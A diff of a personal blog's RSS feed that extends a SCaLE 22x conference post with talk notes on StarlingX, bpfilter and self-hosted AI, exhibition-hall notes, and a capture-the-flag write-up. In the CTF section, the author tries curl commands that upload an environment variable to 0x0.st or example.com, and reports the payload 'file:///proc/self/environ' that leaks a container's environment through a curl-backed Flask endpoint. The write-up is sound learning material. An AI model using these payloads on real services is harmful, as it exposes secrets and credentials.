@@ -12,7 +12,7 @@
 <generator>quarto-1.6.40</generator>
 <lastBuildDate>Tue, 25 Mar 2025 07:00:00 GMT</lastBuildDate>
 <item>
-  <title>SCaLE 22x, Day 1 and 2</title>
+  <title>SCaLE 22x, Day 1, 2 and 3</title>
   <link>./blog/scale-22/</link>
   <description><![CDATA[ 
 
@@ -36,6 +36,90 @@
 <section id="openinfra-days" class="level1">
 <h1>OpenInfra Days</h1>
 <p>I went to the first meeting, and was immediately introduced to an interesting software — <a href="https://docs.rackspacecloud.com/genestack-components/">genestack</a>. Unlike openstack helm, it doesn’t seem to <em>require</em> rook ceph, despite being a kubernetes deployment, which makes it very appealing. Currently, I am attempting to deploy Openstack on my single Kubernetes server, using FluxCD and Openstack-helm, but I am encountering a blockage because ceph doesn’t like being deployed on a single node.</p>
+<section id="kubernetes-as-a-geographically-distributed-system" class="level2">
+<h2 class="anchored" data-anchor-id="kubernetes-as-a-geographically-distributed-system">Kubernetes as a Geographically Distributed System</h2>
+<p><a href="https://www.socallinuxexpo.org/scale/22x/presentations/kubernetes-geographically-distributed-system" class="uri">https://www.socallinuxexpo.org/scale/22x/presentations/kubernetes-geographically-distributed-system</a></p>
+<p>This presentation is about StarlingX, which is noted below. It’s a very interesting piece of software.</p>
+<p>StarlingX:</p>
+<ul>
+<li>Started 7 years ago</li>
+<li>Built for “edge computing”</li>
+<li>All of the system services and components are deployed in containers</li>
+<li>Sees heavy use in the telecommunications sectors</li>
+</ul>
+<p>More discussion of Kata-Containers, it seems that they use it for security at the edge. It can also be used for multi-tenancy.</p>
+<p>Deployment models:</p>
+<ul>
+<li>One/two server models</li>
+<li>Ceph for storage, can use ceph on one node deployments
+<ul>
+<li>Can use external ceph for larger deployments</li>
+</ul></li>
+<li>Control, storage, and worker nodes</li>
+<li>AIO (all in one) simplex:
+<ul>
+<li>No high availability or redundancy</li>
+</ul></li>
+<li>AIO Duplex: Two nodes, so if one fails the setup stays up</li>
+<li>Standard: Two controller nodes (with storage) and then a worker/compute node</li>
+<li>Some nodes can be used as storage nodes regardless</li>
+</ul>
+<p>Distributed Cloud:</p>
+<ul>
+<li>INtroduced in 3.0</li>
+<li>Hetegenerous kubernetes/openstack environment</li>
+<li>Central cloud, a controller cloud
+<ul>
+<li>Horizon dashboard, docker registry, keystone</li>
+</ul></li>
+<li>Remote, geographically dispered edge clouds
+<ul>
+<li>They are semi-autonomous, meaning they work without network</li>
+</ul></li>
+<li>Distributed control plane</li>
+</ul>
+<p>Resiliencey/Geo redundancy</p>
+<ul>
+<li>If a natural disaster/etc happens, the system doesn’t go down</li>
+<li>If one cluster goes down, the system stays up</li>
+</ul>
+<p>Management:</p>
+<ul>
+<li>Tools to configure pxeboot, lifecycle, health and sensors</li>
+<li>Monitoring of stuff</li>
+<li>BMC/IPMI management things</li>
+<li>Service management, configures high availability profiles</li>
+<li>Auto update software, and/or add more functionality
+<ul>
+<li>Rolling updates</li>
+</ul></li>
+</ul>
+<p>StarlingX is used heavily in the Telecom segments:</p>
+<ul>
+<li>They require 5 9’s of uptime. They require less than 5 minutes of downtime for a whole <strong>YEAR</strong> of uptime.</li>
+</ul>
+<p>New things in 10.0:</p>
+<ul>
+<li>Ipv4/v6 dual stack</li>
+<li>Kata containers support</li>
+<li>Managing up to 5,000 sites per system controler</li>
+<li>Unified software management</li>
+<li>Switch between standard and/or low latency kernel at runtime
+<ul>
+<li>Low latency sounds cool but has higher resource usage and resource needs. Presenter suggests sticking with standards unless you require specific things.</li>
+</ul></li>
+</ul>
+<p>Telecom deployment things:</p>
+<ul>
+<li>StarlingX is used in 5G deployments?!
+<ul>
+<li>“Highly Utilized”</li>
+<li>Small footprint.</li>
+</ul></li>
+<li>Precision time protocol</li>
+</ul>
+<p>Smallest deployment needs 1 cpu core.</p>
+<p><a href="https://starlingx.io/blog" class="uri">https://starlingx.io/blog</a></p>
 <p>Interesting software/product list:</p>
 <ul>
 <li><a href="https://github.com/rackerlabs/genestack">Genestack</a> — Openstack on/alongside K8s.</li>
@@ -46,7 +130,7 @@
 </ul></li>
 <li><a href="https://www.starlingx.io/">StarlingX</a>
 <ul>
-<li>Linux, Debian, Kubernetes, Openstack, seems to be a Linux distro, they offer an ISO.</li>
+<li>Linux, Debian, Kubernetes, Openstack (on kubernetes), seems to be a Linux distro, they offer an ISO.</li>
 <li>“Enhanced Networking” — ipv6, dual stack support, now available</li>
 </ul></li>
 <li><a href="https://github.com/platform9/vjailbreak">vJailbreak</a> — automatic migrations from vmware to openstack.
@@ -58,6 +142,7 @@
 <li><a href="https://cloudlab.us" class="uri">https://cloudlab.us</a>, <a href="https://chameleoncloud.readthedocs.io/en/latest/contents.html" class="uri">https://chameleoncloud.readthedocs.io/en/latest/contents.html</a>, Jetstream2</li>
 </ul></li>
 </ul>
+</section>
 </section>
 <section id="planetnix" class="level1">
 <h1>PlanetNix</h1>
@@ -382,12 +467,233 @@
 <section id="devopsdayla" class="level1">
 <h1>DevopsDayLA</h1>
 <p>So apparently, DevopsDay LA has a regular meetup, every two months, on Thursday in Santa Monica.</p>
-<p>Interesting software/products: * <a href="https://runme.dev" class="uri">https://runme.dev</a> — Interactive markdown notebooks for devops</p>
 <p><img src="./blog/scale-22/images/thankyoudevopsers.jpg" class="img-fluid"></p>
-<p>This is funny, but it should be noted that DevOps as a career as a lot of remote jobs.</p>
+<p>This is funny, but it should be noted that DevOps as a career has many remote jobs, which is what this may be referencing.</p>
+<p>Interesting software/products:</p>
+<ul>
+<li><a href="https://runme.dev" class="uri">https://runme.dev</a> — Interactive markdown notebooks for devops</li>
+</ul>
 </section>
-<section id="notes-from-friends" class="level1">
-<h1>Notes from Friends</h1>
+<section id="scale-presentations" class="level1">
+<h1>Scale Presentations</h1>
+<section id="a-simpler-and-faster-firewall-with-bpfilter" class="level2">
+<h2 class="anchored" data-anchor-id="a-simpler-and-faster-firewall-with-bpfilter">A simpler and faster firewall with bpfilter</h2>
+<p><a href="https://www.socallinuxexpo.org/scale/22x/presentations/simpler-and-faster-firewall-bpfilter" class="uri">https://www.socallinuxexpo.org/scale/22x/presentations/simpler-and-faster-firewall-bpfilter</a></p>
+<p><a href="https://naccy.de/2024/10/01/bpfilter-status-report.html" class="uri">https://naccy.de/2024/10/01/bpfilter-status-report.html</a> — blog post by the presenter from last eyar</p>
+<p>Linux Firewalls:</p>
+<ul>
+<li>Iptables: Rules are shaped as C structures
+<ul>
+<li>See my notes on the problems with iptables from the other talk “Kubernetes and the Dragons in Linux Kernel vs.&nbsp;Userspace Tools”</li>
+<li>Not very performant, after 512 rules, performance goes down immensely</li>
+</ul></li>
+<li>Nftables: Performance drops off after 128 rules, before iptables does</li>
+<li>BPF: Much more performant, can also do things like calling a program along with the packet.
+<ul>
+<li>You must write C code, that works for a specific version of an unstable API</li>
+<li>Faster than iptables or nftables</li>
+</ul></li>
+<li>BPFilter firewall
+<ul>
+<li>performance drops off at 1024</li>
+</ul></li>
+</ul>
+<p>You can make the firewalls faster using “sets”</p>
+<ul>
+<li>No performance dropoff after a certain amount of rulesets</li>
+<li>Works on nftables and bpfilter</li>
+</ul>
+<p>Audience member: Have you done a comparison between bpfilter and “nftables offload” where it runs on the NIC itself? But bpfilter seems to also be able to offload.</p>
+<p>3 main components:</p>
+<ul>
+<li>bfcli, libbpfilter, bpfilter</li>
+<li>Much more usable cli</li>
+</ul>
+<p>Chain architecture:</p>
+<ul>
+<li>Chain is similar to a chain in iptables or a table in nftables</li>
+<li>In the chain there are rules, and the rules have an action</li>
+<li>Can decide to do normal firewall things, like drop packets</li>
+</ul>
+<p>Bytecode Factory:</p>
+<ul>
+<li>Bpfilter creates BPF programs</li>
+<li>Similar to event driven programming</li>
+<li>Runtime context of the program disappears when it returns, so you have to make “maps to save data”</li>
+<li>All the bytecode runs in the kernelspace</li>
+<li>BPF verifier will check that BPF code is valid</li>
+</ul>
+<p>Demo:</p>
+<ul>
+<li>He runs iptables-legacy and then adjusts some rules</li>
+<li>Then uses bpfilter to change some rules and drop some backets</li>
+<li>The bpfilters daemon can be “closed”, and then it will stop accepting connections. However, the program is still running.</li>
+<li>He shows the bpfilter config setup. It’s… okay. But it’s simialr in complexity (and power), as iptables. For usage by a homelabber or other inexperienced user it would need to be abstracted by another layer like how firewalld and ufw abstract ip/nftables.</li>
+<li>Bpfilter also have sets, he shows us a set of ip’s in the config file</li>
+</ul>
+<p><a href="https://bpfilter.io" class="uri">https://bpfilter.io</a></p>
+<p>BPFilter roadmap: <a href="https://github.com/orgs/facebook/projects/50" class="uri">https://github.com/orgs/facebook/projects/50</a></p>
+<p>RPM package available in fedora. But the presenter reccommends building it yourself.</p>
+<p>Questions (more like answers):</p>
+<ul>
+<li>I am not satisfied with the answer to my question: What if there are multiple bpclients on the system configuring a single bpfilter daemon
+<ul>
+<li>But it seems to be better architectured and dodges some of the issues</li>
+</ul></li>
+<li>It can be used alongside nftables for features that it lacks</li>
+</ul>
+</section>
+<section id="affording-your-ai-chatbot-friends" class="level2">
+<h2 class="anchored" data-anchor-id="affording-your-ai-chatbot-friends">Affording your AI chatbot friends</h2>
+<p><a href="https://www.socallinuxexpo.org/scale/22x/presentations/affording-your-ai-chatbot-friends" class="uri">https://www.socallinuxexpo.org/scale/22x/presentations/affording-your-ai-chatbot-friends</a></p>
+<p>What if your boss insists that you need AI?</p>
+<ul>
+<li>But what does AI mean?</li>
+<li>What even are you supposed to deploy?</li>
+<li>Buy or build? Moving parts? What infra? What is an “AI agent”? Is this expensive?…</li>
+</ul>
+<p>AI agent:</p>
+<ul>
+<li>Model that has access to tools, e.g escalating tickets, running sql queries, or</li>
+<li>Think square peg, round hole?</li>
+</ul>
+<p>Moving parts of AI:</p>
+<ul>
+<li>Models: Big balls of floating point numbers that take input, turn tokens into embeddedings, do CUDA magic, and then spit out more tokens
+<ul>
+<li>Try llama models to start. Deepseek, or OpenAI</li>
+</ul></li>
+<li>Inference engine: Thing that runs the models
+<ul>
+<li>llama.cpp, or the python things</li>
+<li>This is the part that needs the GPU to run, the pricy part</li>
+</ul></li>
+<li>Your code:
+<ul>
+<li>Sits in the middle, wraps</li>
+<li>Most diverse and opinionated</li>
+</ul></li>
+<li>UI
+<ul>
+<li>sparkly part</li>
+</ul></li>
+</ul>
+<p>“Excessive acronym compliance” lmao</p>
+<p>Model provider methods:</p>
+<ul>
+<li>Relying on OpenAI means you rely on them to keep your business afloat.
+<ul>
+<li>Most providers sell at a loss to get adoption</li>
+<li>They have replaced snapshots off models with differenent models. Xe had an issue where a new snapshot of chatgpt turned their chatbot fro happy to depressed <code>:(</code>.</li>
+<li>Deprecations become emergency.</li>
+</ul></li>
+<li>Self hosting
+<ul>
+<li>Big models are truly massive. “Big data is bigger than most people’s laptop ram”.</li>
+<li>You own the stack, and can choose models or the deprecation schedule.</li>
+<li>A lot more freedom and control</li>
+<li>No data is sent to third parties. “This can be very important in acronym compliance”.</li>
+</ul></li>
+</ul>
+<p>Downsides to self hosting:</p>
+<ul>
+<li>Nvidia drivers… <code>:(</code>. “They will never fall over work hours”.
+<ul>
+<li>Can be worked around with reduancy, but there are tradeoffs.</li>
+</ul></li>
+<li>You have to choose the models. Choice paralysis.</li>
+<li>Must be opinionated about ollama vs llama.cpp or the other options.
+<ul>
+<li>Must do research and develop opinions, which costs time.</li>
+</ul></li>
+<li>You need GPU’s by Nvidia.
+<ul>
+<li>“I can’t stop you from hurting yourself” — when referring to AMD or apple silicon options</li>
+<li>Nvidia GPU’s are the easiest, but extremely pricy, and also have a big wait time.</li>
+<li>Service life of one to three years.</li>
+</ul></li>
+</ul>
+<p>Middle path, Nomadic Compute:</p>
+<ul>
+<li>“Nomadic Compute” — new buzzword by Xe Iaso</li>
+<li>Cheating by your setup hunting down the best deal from providers.</li>
+<li>All cloud providers have GPU’s. Xe said they saw small clouds on lowendbox advertising GPU setups.</li>
+<li>GPU’s you only need model year, video memory, and memory bandwidth. Nothing else matters.</li>
+<li>Older cards can be used for AI workflows, but the price per hour goes down.</li>
+</ul>
+<p>Skypilot:</p>
+<ul>
+<li>Abstraction layer for infrastructure as a service</li>
+<li>Give it a bunch of API keys</li>
+<li>It will figure out the best deal and then switch</li>
+<li>It will also autoscale up and down</li>
+</ul>
+<p>Advice:</p>
+<ul>
+<li>Build on top of boring tools. Don’t waste your “innovation budget”.
+<ul>
+<li>E.g. Postgres. Object storage. Wireguard in userspace.</li>
+</ul></li>
+<li>Treat it like a database.</li>
+<li>Scale things down when not in use, in order to save money.</li>
+<li>Cheat by putting your model weights directly into the docker image.
+<ul>
+<li>If the image contains the weights, many platforms won’t charge you for the pull time</li>
+</ul></li>
+<li>Wireguard can be ran in userspace, which is useful for joining machines to eachothers network.</li>
+</ul>
+<p>Xe started wanting to self host everything, but reality got in the way.</p>
+<p>Example Project, Mimi, an AI chatbot that gets images from discord:</p>
+<ul>
+<li>Used to be entirely self hosted across 3 nodes
+<ul>
+<li>Homelab server has 12 GB of vram</li>
+</ul></li>
+<li>Meta releases llama3, which requires 48 GB of vram.</li>
+<li>But now runs on a cloud architecture
+<ul>
+<li>5 dollars (canadia money?) per month for Mimi’s cloud features</li>
+</ul></li>
+<li>Filter model still runs on self hosted.</li>
+</ul>
+<p>“It’s okay to use the cloud, just have an exit strategy”</p>
+<p><a href="https://opensource.org/ai/open-weights" class="uri">https://opensource.org/ai/open-weights</a></p>
+<p><a href="https://fal.ai/" class="uri">https://fal.ai/</a> — Flux image generator as a service, where you pay per image. Much cheaper than running Flux locally, but is not a locked in setup.</p>
+<p>Every input matters:</p>
+<ul>
+<li>Claude gets lazy around august, Chatgpt gets really bad around december. Dates of chat have an effect on the LLM output.</li>
+<li>The seed value can be set so that it’s deterministic
+<ul>
+<li>“seed 3407 is all your need”</li>
+</ul></li>
+<li>Set the temperature (randomness of output) as low as possible when trying to do something deterministic.</li>
+<li>If an app doesn’t need an input, don’t give it to an LLM.</li>
+</ul>
+<p>Filter models:</p>
+<ul>
+<li>Sits in the middle of the AI flow, and checks the user input to ensure it is safe.</li>
+<li>Also can sanitize</li>
+<li>Prevents<br>
+</li>
+<li>Two most popular are: llamaguard (Xe stated llamaguard3-8b is good despite being small, because it is finetuned) from facebook, and shieldguard from google.</li>
+<li>One time Mimi decided that <em>everything</em> was “Election Interference”</li>
+</ul>
+<p><a href="https://openrouter.ai/" class="uri">https://openrouter.ai/</a></p>
+<p>Quantization: lossy compression to make the AI models smaller. The loss is minimal, but neglible.</p>
+<p>Relevant Blogpost: <a href="https://www.tigrisdata.com/blog/ai-chatbot-friends/" class="uri">https://www.tigrisdata.com/blog/ai-chatbot-friends/</a></p>
+</section>
+</section>
+<section id="scale-next-generation" class="level1">
+<h1>Scale Next Generation</h1>
+<p>They had a great deal of stuff set up for the next generation of Linux users, middle and high schoolers. I thought it was really cool, and since I like teaching, one of the organizers suggested that I hit them up and volunteer</p>
+<p>They had multiple machines with the microbits, $20 little pi-like devices that can run python, for teaching python programming.</p>
+<p><img src="./blog/scale-22/images/microbitnextgen.jpg" class="img-fluid"></p>
+<p>They also had an array of books on Linux and software things:</p>
+<p><img src="./blog/scale-22/images/nextgenbooks.jpg" class="img-fluid"></p>
+<p>It was pretty neat.</p>
+</section>
+<section id="notes-from-friends-and-other-misc-notes" class="level1">
+<h1>Notes from Friends and other Misc Notes</h1>
 <p>Nix can become nigthmarish to update on Mac OS, due to the system level changes that Mac makes: <a href="https://zenn.dev/kawarimidoll/scraps/3d71b16d1bb7e3" class="uri">https://zenn.dev/kawarimidoll/scraps/3d71b16d1bb7e3</a>.</p>
 <p>Best large language model for coding: qwen2.5-32b-instruct. “On par with gpt-02-mini”.</p>
 <p>A backend developer would be expected to deploy things and debug containers in kubernetes, or at least understand how their application will run in a k8s environment. Don’t have to be experts. For backend, frontend, not really.</p>
@@ -404,22 +710,69 @@
 <p>Linbit, open source block storage</p>
 <p>Hackathons sometimes involve shark tank style pitches.</p>
 <p>ID tech teaching platform</p>
+<p>Georgia Tech Research Institute is always hiring.</p>
+<p>Oracle Linux has a one/two click VM that runs: <a href="https://xeiaso.net/notes/2025/k8s-dev-mac-oracle-linux/" class="uri">https://xeiaso.net/notes/2025/k8s-dev-mac-oracle-linux/</a></p>
+<p>Onepassword has a nice kubernetes operator.</p>
+<p>Git forges are especially vulnerable to AI scrapers, since they have so many links and commit history saved. Xe Iaso’s proof of work captcha led to a 90% reduction on Gnome’s gitlab. If you return http 200 and at least 4 kilobytes of html, scrapers will give up. <a href="https://xeiaso.net/blog/2025/anubis/" class="uri">https://xeiaso.net/blog/2025/anubis/</a></p>
+<p>Open Compute project.</p>
 </section>
 <section id="job-board" class="level1">
 <h1>Job Board</h1>
 <p>There is a literal job baord at SCaLE, a literal whiteboard where companies mention they are hiring or people state that they are looking for a job.</p>
 <p><img src="./blog/scale-22/images/jobboard1.jpg" class="img-fluid"></p>
 <p><img src="./blog/scale-22/images/jobboard2.jpg" class="img-fluid"></p>
+<p><img src="./blog/scale-22/images/jobboard3.jpg" class="img-fluid"></p>
+<p><img src="./blog/scale-22/images/jobboard4.jpg" class="img-fluid"></p>
 </section>
 <section id="exhibition-hall" class="level1">
 <h1>Exhibition Hall</h1>
 <p>There was some fun stuff in the exhibition hall.</p>
-<p>There was lots of ARM stuff.</p>
+<p>There was a bunch of this new Arm system76 desktop, which they displayed at their booth:</p>
+<p><img src="./blog/scale-22/images/system76.jpg" class="img-fluid"></p>
+<p>But it was also at the Arm booth:</p>
+<p><img src="./blog/scale-22/images/armbooth.jpg" class="img-fluid"></p>
+<p>And the Nixos booth (they were using it as a build server/cache on Thursday/Friday in the other conference building and today)</p>
+<p><img src="./blog/scale-22/images/nixosampere.jpg" class="img-fluid"></p>
+<p>And the Alma Linux booth also had one of these devices:</p>
+<p><img src="./blog/scale-22/images/almaampere.jpg" class="img-fluid"></p>
+<p>I learned at that booth that apparently, Ovirt is being built and tested against Alma Linux now.</p>
+<p>There was other Arm stuff, like this Mac Mini running Arm and Asahi Linux, where they were installing games from steam during the exhibition hall. This was from the Meta/Facebook table.</p>
 <p><img src="./blog/scale-22/images/macminiarm.jpg" class="img-fluid"></p>
-<p>Like this Mac Mini running Arm and Asahi Linux, where they were installing games from steam during the exhibition hall.</p>
+<p>I learned at the Sofware Freedomm Conservancy booth that they sponsored the event, and all of the routers in the event run the fully free software openwrt operating system.</p>
+<p><img src="./blog/scale-22/images/router1.jpg" class="img-fluid"></p>
+<p><img src="./blog/scale-22/images/router2.jpg" class="img-fluid"></p>
+<p>WRCCDC had a booth as well:</p>
+<p><img src="./blog/scale-22/images/wrccdc.jpg" class="img-fluid"></p>
+<p>A really interesting booth was the Mentors in Tech (MINT) booth.</p>
+<p><img src="./blog/scale-22/images/mentorsintech.jpg" class="img-fluid"></p>
+<p>They run a mentorship program for students.</p>
+<p>Meetups I just learned about (Or haven’t gone to yet):</p>
+<ul>
+<li>Datacon LA, a 1 day conference in la</li>
+<li><a href="https://issasocal.org" class="uri">https://issasocal.org</a>
+<ul>
+<li>Information systems security association</li>
+<li>Semi-regular meetups in LA</li>
+</ul></li>
+<li>Owasp
+<ul>
+<li>Last wednesday of every month</li>
+<li>Can RSVP on Linkedin</li>
+</ul></li>
+<li>Information technology disaster resource center
+<ul>
+<li>They volunteer to set up IT infrastructure in disaster areas that need it</li>
+<li><a href="https://www.itdrc.org/" class="uri">https://www.itdrc.org/</a></li>
+<li>Require some trainings, and offer some free trainings on what is needed to do the job</li>
+</ul></li>
+</ul>
 <p>Interesting software/products/stuff:</p>
 <ul>
-<li><a href="https://coder.dev" class="uri">https://coder.dev</a></li>
+<li><a href="https://coder.dev" class="uri">https://coder.dev</a>
+<ul>
+<li>Self hosted deployment of online code workspaces</li>
+<li>They also seem to offer kasmvnc or rdp, in addition to vscode web version</li>
+</ul></li>
 <li>FastX
 <ul>
 <li>Virtual Desktop Infrastructure offering Linux machines</li>
@@ -433,6 +786,130 @@
 <ul>
 <li>Computing talent initiative, sign people up for this</li>
 </ul></li>
+</ul>
+</section>
+<section id="ctf" class="level1">
+<h1>CTF</h1>
+<p>The CTF is the Pacific Hackers CTF. I might to a mini writeup here.</p>
+<p>First, I try artist, the webdev program. It’s url is at <a href="https://artist.ctf.pacifichackers.com" class="uri">https://artist.ctf.pacifichackers.com</a> I downloaded the source code they provided and saw this in the fake dockerfile:</p>
+<pre class="{Dockerfile}"><code>ENV FLAG="FAKE_FLAG{FOR_TESTING}"</code></pre>
+<p>The code doesn’t have the real flag. But based on this, I am guessing that the real flag is an environment variable injected into the docker container from however they are running it.</p>
+<p>In the flask code, it runs curl to get the background:</p>
+<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb2-1"><span class="cf" style="color: #003B4F;
+background-color: null;
+font-weight: bold;
+font-style: inherit;">try</span>:</span>
+<span id="cb2-2">    result <span class="op" style="color: #5E5E5E;
+background-color: null;
+font-style: inherit;">=</span> subprocess.run(</span>
+<span id="cb2-3">        [<span class="st" style="color: #20794D;
+background-color: null;
+font-style: inherit;">'curl'</span>, <span class="st" style="color: #20794D;
+background-color: null;
+font-style: inherit;">'-s'</span>, <span class="st" style="color: #20794D;
+background-color: null;
+font-style: inherit;">'-L'</span>, background],</span>
+<span id="cb2-4">        capture_output<span class="op" style="color: #5E5E5E;
+background-color: null;
+font-style: inherit;">=</span><span class="va" style="color: #111111;
+background-color: null;
+font-style: inherit;">True</span>,</span>
+<span id="cb2-5">        shell<span class="op" style="color: #5E5E5E;
+background-color: null;
+font-style: inherit;">=</span><span class="va" style="color: #111111;
+background-color: null;
+font-style: inherit;">False</span></span>
+<span id="cb2-6">    )</span></code></pre></div>
+<p>This is ultra sus. Also, I feel like setting the background of a simple drawing app shouldn’t require or interact with the backdend.</p>
+<p>We need to make a command that uploads or publishes the environment variable. However, <code>shell=False</code> means we can’t use “&amp;&amp;” or any bash-isms to get more commands.</p>
+<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb3-1">[moonpie@osiris ~]$ curl -sL -F</span>
+<span id="cb3-2">curl: option -F: requires parameter</span>
+<span id="cb3-3">curl: try 'curl --help' for more information</span></code></pre></div>
+<p>Interesing. We can do -F, which uploads along with the thing.</p>
+<p>So if we do something like this: <code>-F "file=@-" https://0x0.st &lt;&lt;&lt; "$FLAG"</code> and then it should upload our flag to 0x0.st.</p>
+<p>Pastebin. Doesn’t seem to work. I threw up my own http server on my server. Maybe something like this? :</p>
+<pre><code>curl -d "key1=value1&amp;key2=${ENV_VARIABLE}" http://example.com</code></pre>
+<p>This fails since python http server doesn’t accept post. So I have gpt throw together something that does:</p>
+<div class="sourceCode" id="cb5" style="background: #f1f3f5;"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb5-1"><span class="im" style="color: #00769E;
+background-color: null;
+font-style: inherit;">from</span> http.server <span class="im" style="color: #00769E;
+background-color: null;
+font-style: inherit;">import</span> HTTPServer, BaseHTTPRequestHandler</span>
+<span id="cb5-2"></span>
+<span id="cb5-3"><span class="kw" style="color: #003B4F;
+background-color: null;
+font-weight: bold;
+font-style: inherit;">class</span> SimpleHTTPRequestHandler(BaseHTTPRequestHandler):</span>
+<span id="cb5-4">    <span class="kw" style="color: #003B4F;
+background-color: null;
+font-weight: bold;
+font-style: inherit;">def</span> do_POST(<span class="va" style="color: #111111;
+background-color: null;
+font-style: inherit;">self</span>):</span>
+<span id="cb5-5">        content_length <span class="op" style="color: #5E5E5E;
+background-color: null;
+font-style: inherit;">=</span> <span class="bu" style="color: null;
+background-color: null;
+font-style: inherit;">int</span>(<span class="va" style="color: #111111;
+background-color: null;
+font-style: inherit;">self</span>.headers[<span class="st" style="color: #20794D;
+background-color: null;
+font-style: inherit;">'Content-Length'</span>])</span>
+<span id="cb5-6">        post_data <span class="op" style="color: #5E5E5E;
+background-color: null;
+font-style: inherit;">=</span> <span class="va" style="color: #111111;
+background-color: null;
+font-style: inherit;">self</span>.rfile.read(content_length).decode(<span class="st" style="color: #20794D;
+background-color: null;
+font-style: inherit;">'utf-8'</span>)</span>
+<span id="cb5-7">        <span class="bu" style="color: null;
+background-color: null;
+font-style: inherit;">print</span>(<span class="ss" style="color: #20794D;
+background-color: null;
+font-style: inherit;">f"Received data: </span><span class="sc" style="color: #5E5E5E;
+background-color: null;
+font-style: inherit;">{</span>post_data<span class="sc" style="color: #5E5E5E;
+background-color: null;
+font-style: inherit;">}</span><span class="ss" style="color: #20794D;
+background-color: null;
+font-style: inherit;">"</span>)</span>
+<span id="cb5-8">        <span class="va" style="color: #111111;
+background-color: null;
+font-style: inherit;">self</span>.send_response(<span class="dv" style="color: #AD0000;
+background-color: null;
+font-style: inherit;">200</span>)</span>
+<span id="cb5-9">        <span class="va" style="color: #111111;
+background-color: null;
+font-style: inherit;">self</span>.end_headers()</span>
+<span id="cb5-10">        <span class="va" style="color: #111111;
+background-color: null;
+font-style: inherit;">self</span>.wfile.write(<span class="st" style="color: #20794D;
+background-color: null;
+font-style: inherit;">b"Data received successfully"</span>)</span>
+<span id="cb5-11"></span>
+<span id="cb5-12">httpd <span class="op" style="color: #5E5E5E;
+background-color: null;
+font-style: inherit;">=</span> HTTPServer((<span class="st" style="color: #20794D;
+background-color: null;
+font-style: inherit;">'localhost'</span>, <span class="dv" style="color: #AD0000;
+background-color: null;
+font-style: inherit;">8000</span>), SimpleHTTPRequestHandler)</span>
+<span id="cb5-13"><span class="bu" style="color: null;
+background-color: null;
+font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
+background-color: null;
+font-style: inherit;">"Server running on http://localhost:8000"</span>)</span>
+<span id="cb5-14">httpd.serve_forever()</span></code></pre></div>
+<p>And then I run this. <code>curl -X POST -d "Hello, server!" http://localhost:8000</code> to send stuff.</p>
+<p>I still can’t exploit the flask logic, however. Also, I don’t know how to do a shell variable replacement from here. I think this is too complex. It seems that the logic returns a base64 encoded version of whatever the output is, so I’ll just attempt to get curl to print the environment variable.</p>
+<p><code>curl -w "Username: $TEST\n" http://example.com</code></p>
+<p>Whoops, there is an easier way to do this, given to me by a friend:</p>
+<p><code>file:///proc/self/environ</code></p>
+<p>Just have that as the parameter, and then it outputs a base64 of all of the envirnoment variables.</p>
+<p>But there is a really interesting set of challenges, the <a href="https://pacifichackers.com/challenges#Level%201">bashcrawl challenges</a>, which are used to teach linux.</p>
+<ul>
+<li><a href="https://github.com/mks22-dw/bashcrawl" class="uri">https://github.com/mks22-dw/bashcrawl</a></li>
+<li><a href="https://mybinder.org/v2/gl/nthiery%2Fbashcrawl/HEAD" class="uri">https://mybinder.org/v2/gl/nthiery%2Fbashcrawl/HEAD</a></li>
 </ul>
 </section>
 <section id="loot" class="level1">
@@ -461,6 +938,9 @@
 <p><img src="./blog/scale-22/images/darkchocolate.jpg" class="img-fluid"></p>
 <p>It was pretty good, 70% dark. It was hard to break pieces off so I could eat or share them though. I only ate half off it, and threw the rest away, it was a really big bar and I couldn’t eat all of it.</p>
 <p>For dinner I had an extra one of the sandwiches mentioned above, which a friend had given to me and I saved it so I could eat it later.</p>
+<p>Day 3:</p>
+<p>For lunch, I went to the food place they had in the exhibition hall. I had a chicken sandwich, and fries, and it was actually pretty good. I forgot to take a picture <code>:(</code>.</p>
+<p>For dinner, I went to El Cholo. I also forgot to take a picture, but I talked a ton with the nix people. It was also pretty good.</p>
 
 
 </section>
